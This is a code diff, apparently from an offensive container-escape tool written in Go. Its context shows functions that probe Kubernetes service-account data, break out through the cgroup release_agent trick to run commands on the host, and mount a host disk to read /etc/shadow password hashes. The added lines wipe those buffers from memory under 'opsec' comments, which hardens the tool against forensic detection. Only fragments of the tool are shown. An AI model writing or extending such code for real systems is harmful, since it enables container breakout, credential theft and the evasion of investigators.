@@ -170,6 +170,7 @@ func escapeCheck() (string, string) {
 	// 8. K8s namespace/SA info
 	if ns, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
 		sb.WriteString(fmt.Sprintf("[*] K8s namespace: %s\n", strings.TrimSpace(string(ns))))
+		structs.ZeroBytes(ns) // opsec: clear K8s namespace info
 	}
 
 	// 9. Mounted host filesystems
@@ -442,6 +443,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	if data, err := os.ReadFile(outputPath); err == nil {
 		sb.WriteString("\n--- Output ---\n")
 		sb.WriteString(string(data))
+		structs.ZeroBytes(data) // opsec: clear arbitrary command output
 	} else {
 		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
 		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
@@ -631,6 +633,7 @@ func escapeMountHost(devicePath string) (string, string) {
 	// Read /etc/shadow if possible
 	shadowPath := filepath.Join(mountPoint, "etc/shadow")
 	if data, err := os.ReadFile(shadowPath); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear password hashes from memory
 		lines := strings.Split(string(data), "\n")
 		sb.WriteString(fmt.Sprintf("\n--- /etc/shadow (%d entries) ---\n", len(lines)))
 		for _, line := range lines {
